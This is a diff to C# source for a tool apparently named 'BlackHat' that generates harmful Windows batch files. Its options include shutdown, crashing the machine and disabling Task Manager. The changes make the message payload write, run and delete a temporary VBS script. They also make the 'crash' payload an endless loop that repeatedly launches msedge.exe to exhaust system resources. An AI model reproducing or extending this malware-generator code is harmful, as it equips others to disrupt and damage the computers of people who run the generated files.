@@ -68,7 +68,7 @@ namespace BlackHat
                         }
                         else if (MessageCheck.Checked)//send message
                         {
-                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\""+Messagetext.Text+"\"");
+                            sw.Write("echo msgbox \""+Messagetext.Text+"\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                         }
                         else if (DisableTaskCheck.Checked)//disables taskmanager
                         {
@@ -113,7 +113,7 @@ namespace BlackHat
                         }
                         else if (MessageCheck.Checked)
                         {
-                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
+                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                         }
                         else if (DisableTaskCheck.Checked)
                         {
@@ -158,7 +158,7 @@ namespace BlackHat
                         }
                         else if (MessageCheck.Checked)
                         {
-                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
+                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                         }
                         else if (DisableTaskCheck.Checked)
                         {
@@ -204,7 +204,7 @@ namespace BlackHat
                         }
                         else if (MessageCheck.Checked)
                         {
-                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
+                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                         }
                         else if (DisableTaskCheck.Checked)
                         {
@@ -251,7 +251,7 @@ namespace BlackHat
                         else
                         if (MessageCheck.Checked)
                         {
-                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
+                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                         }
                         else if (DisableTaskCheck.Checked)
                         {
@@ -298,7 +298,7 @@ namespace BlackHat
                         else
                         if (MessageCheck.Checked)
                         {
-                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
+                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                         }
                         else
                         if (DisableTaskCheck.Checked)
@@ -317,7 +317,7 @@ namespace BlackHat
                     using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                     using (StreamWriter sw = new StreamWriter(s))
                     {
-                        sw.Write("\necho Msgbox\""+ Messagetext.Text + "\",48+1,\"");
+                        sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
 
                         if (ShutdownBox.Checked)
                         {
@@ -346,7 +346,7 @@ namespace BlackHat
                         else
                         if (CrashCheck.Checked)
                         {
-                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
+                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                         }
                         else
                         if(DisableTaskCheck.Checked)
@@ -399,7 +399,7 @@ namespace BlackHat
                         else
                         if (MessageCheck.Checked)
                         {
-                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
+                            sw.Write("echo msgbox \"" + Messagetext.Text + "\" > %tmp%\\tmp.vbs\nwscript %tmp%\\tmp.vbs\r\ndel %tmp%\\tmp.vbs");
                         }
                     }
                 }
